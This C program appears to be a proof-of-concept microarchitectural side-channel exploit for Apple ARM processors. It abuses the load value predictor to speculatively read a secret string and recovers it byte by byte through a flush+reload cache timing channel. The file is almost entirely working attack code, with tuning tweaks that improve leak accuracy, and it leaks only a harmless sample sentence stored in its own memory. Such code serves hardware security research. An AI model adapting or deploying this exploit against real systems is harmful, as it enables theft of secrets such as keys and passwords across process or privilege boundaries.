#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <time.h>

#define PAGE_SZ 16384
#define CACHE_LINE_SZ 128
#define NUM_CACHELINES (PAGE_SZ / CACHE_LINE_SZ)
#define CACHE_HIT_THRESHOLD 80
#define REPS 300
#define TRIALS 30 // Bumped slightly for a stronger consensus

#define READ(addr) (*(volatile uint32_t *)(addr))
#define FORCE_READ(addr, trash) (READ((uintptr_t)(addr) | (trash == 0xbaaaaad)))

// We attempt to read this string using the LVP.
const char *secret = "Mr and Mrs Dursley, of number four, Privet Drive, were proud to say that they were perfectly normal, thank you very much. They were the last people youd expect to be involved in anything strange or mysterious, because they just didnt hold with such nonsense.";

volatile unsigned char * volatile aop[2];

// Note: must serialize with isb and dsb ish
inline __attribute__((always_inline)) void clflush(void *ptr)
{
    asm volatile("dc civac, %0" : : "r"(ptr) : "memory");
}

inline __attribute__((always_inline))
uint64_t
rdtsc()
{
    uint64_t ts;
    asm volatile("dsb ish");
    asm volatile("isb");
    asm volatile("mrs %0, S3_2_c15_c0_0" : "=r"(ts) : :);
    asm volatile("isb");
    return ts;
}

// For shuffling cacheline indices in an array as to randomize
// the memory access pattern.
void shuffle(volatile int *array, volatile int n)
{
    if (n > 1)
    {
        for (int i = 0; i < n - 1; i++)
        {
            volatile int j = i + rand() / (RAND_MAX / (n - i) + 1);
            volatile int temp = array[j];
            array[j] = array[i];
            array[i] = temp;
        }
    }
}

int countMatchingBits(char a, char b)
{
    int matchingBits = 0;
    char xorResult = a ^ b; // XOR the two chars

    // Count the number of zero bits in the XOR result
    for (int i = 0; i < 8; i++)
    {
        if (!(xorResult & (1 << i)))
        {
            matchingBits++;
        }
    }

    return matchingBits;
}

__attribute__((noinline)) void critical_section(void *page, volatile int *indices, volatile unsigned char *channel_ptr, 
    volatile unsigned char *ptr_arg, int iters)
{
    register uint64_t trash = 0;
    for (int i = 0; i < iters; i++)
    {
        aop[0] = ptr_arg;

        volatile int idx = indices[i % NUM_CACHELINES];
        trash = FORCE_READ((volatile char *)page + idx * CACHE_LINE_SZ, trash);

        volatile unsigned char *ptr = aop[(uint8_t)trash];
        volatile unsigned char secret_val = *ptr;
        volatile unsigned char junk = channel_ptr[secret_val * PAGE_SZ];
    }
}

int main(int argc, char *argv[])
{
    // Initialize RNG for random page access.
    srand(time(NULL));

    // Set CPU affinity using KDK interface.
    uint32_t CORE_ID = 5;
    volatile uint32_t ret = sysctlbyname("kern.sched_thread_bind_cpu", NULL, NULL, &CORE_ID, sizeof(uint32_t));
    if (ret == -1)
    {
        printf("Error setting CPU core affinity. Please run as root\n");
        return EXIT_FAILURE;
    }

    // Allocate one test page and memset it
    // such that load values become constant.
    void *page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        printf("Failed to allocate page\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(page, 0x0, PAGE_SZ);
    }

    // Make array to hold the cacheline indices, then
    // shuffle the order of accesses.
    volatile int indices[NUM_CACHELINES];
    for (int i = 0; i < NUM_CACHELINES; i++)
    {
        indices[i] = i;
    }
    shuffle(indices, NUM_CACHELINES);

    // Allocate dummy page.
    void *dummy_page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *dummy_ptr;

    if (dummy_page == MAP_FAILED)
    {
        printf("Failed to allocate dummy pages\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(dummy_page, 0xff, PAGE_SZ);
        dummy_ptr = (unsigned char *)dummy_page;
    }

    // Allocate secret page.    
    void *secret_page = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *secret_ptr;

    if (secret_page == MAP_FAILED)
    {
        printf("Failed to allocate secret pages\n");
        return EXIT_FAILURE;
    }
    else
    {
        strcpy((char *)secret_page, secret);
        secret_ptr = (unsigned char *)secret_page;
    }

    // Allocate the cache channel.
    void *channel_pages = mmap(NULL, 256 * PAGE_SZ, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    unsigned char *channel_ptr;

    if (channel_pages == MAP_FAILED)
    {
        printf("Failed to allocate cache channel pages\n");
        return EXIT_FAILURE;
    }
    else
    {
        memset(channel_pages, 0x99, 256 * PAGE_SZ);
        channel_ptr = (unsigned char *)channel_pages;
    }

    aop[1] = dummy_ptr;

    struct timespec start, end;
    double elapsed_time;
    char result[strlen(secret) + 1];
    result[strlen(secret)] = '\0';

    int diag = (argc > 1);

    clock_gettime(CLOCK_MONOTONIC, &start);

    // Outer loop for each character of the secret
    for (int pos = 0; pos < strlen(secret); pos++)
    {
        int hit_counts[256] = {0};

        for (int trial = 0; trial < TRIALS; ++trial)
        {
            memset(page, 0x0, PAGE_SZ);

            critical_section(page, indices, channel_ptr, dummy_ptr, REPS);

            for (int set = 0; set < 256; ++set)
            {
                clflush((void *)(channel_ptr + set * PAGE_SZ));
            }
            // TWEAK 1: Heavy barrier ensuring the channel is actually flushed
            asm volatile("dsb ish"); 

            memset(page, 0x1, PAGE_SZ);

            for (int i = 0; i < NUM_CACHELINES; i++)
            {
                clflush((void *)((volatile char *)page + i * CACHE_LINE_SZ));
            }

            // Heavy barrier ensuring the trigger page is flushed
            asm volatile("dsb ish");
            asm volatile("isb");

            // Keep the secret character in L1 so the speculative window isn't exhausted
            volatile char dummy_read = *(secret_ptr + pos);

            // Execute the single attack run
            critical_section(page, indices, channel_ptr, secret_ptr + pos, 1);

            uint64_t timings[256];
            for (int i = 0; i < 256; ++i)
            {
                // Scramble the indices to defeat Apple's stride prefetcher
                int mix_i = ((i * 167) + 13) & 255;
                
                uint64_t start_tsc = rdtsc();
                volatile unsigned char trash = channel_ptr[mix_i * PAGE_SZ];
                uint64_t end_tsc = rdtsc();
                timings[mix_i] = end_tsc - start_tsc;
            }

            // TWEAK 2: POST-PROBE FLUSH to prevent bleeding hits into the next trial
            for (int set = 0; set < 256; ++set)
            {
                clflush((void *)(channel_ptr + set * PAGE_SZ));
            }
            asm volatile("dsb ish");
            asm volatile("isb");

            uint64_t min_time = 999999;
            int local_best = -1;

            // TWEAK 3: Limit search to 32 to 126 (printable ASCII). 
            // This natively filters out the 0xff dummy character.
            for (int j = 32; j < 127; ++j)
            {
                if (timings[j] < min_time)
                {
                    min_time = timings[j];
                    local_best = j;
                }
            }

            // If the fastest hit was validly below threshold, give it a vote
            if (min_time < CACHE_HIT_THRESHOLD && local_best != -1)
            {
                hit_counts[local_best]++;
            }
        }

        // Determine the consensus winner for this character
        int best_guess = 0x20; // Default to Space
        int max_hits = 0;
        for (int j = 32; j < 127; ++j)
        {
            if (hit_counts[j] > max_hits)
            {
                max_hits = hit_counts[j];
                best_guess = j;
            }
        }
        result[pos] = (char)best_guess;

        if (diag)
        {
            unsigned char correct = (unsigned char)secret[pos];
            int total_votes = 0;
            for (int j = 32; j < 127; ++j) total_votes += hit_counts[j];
            fprintf(stderr, "pos=%3d secret=0x%02X('%c') winner=0x%02X('%c') winner_votes=%2d correct_votes=%2d total=%2d%s\n",
                pos, correct, correct, (unsigned char)best_guess, best_guess,
                max_hits, hit_counts[correct], total_votes,
                best_guess != (int)correct ? "  <WRONG>" : "");
        }
    }
    clock_gettime(CLOCK_MONOTONIC, &end);

    int matchingBits = 0;
    for (int pos = 0; pos < strlen(secret); pos++)
    {
        matchingBits += countMatchingBits(result[pos], secret[pos]);
    }

    printf("Secret: %s\n", secret);
    printf("Output: %s\n", result);
    printf("%d bits out of %lu total bits match\n", matchingBits, strlen(secret) * 8);
    printf("Accuracy: %.2f\n", (double)matchingBits / (strlen(secret) * 8));

    elapsed_time = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1E9;
    printf("Elapsed time: %.9f seconds\n", elapsed_time);

    munmap(page, PAGE_SZ);
    munmap(dummy_page, PAGE_SZ);
    munmap(secret_page, PAGE_SZ);
    munmap(channel_pages, 256 * PAGE_SZ);

    return EXIT_SUCCESS;
}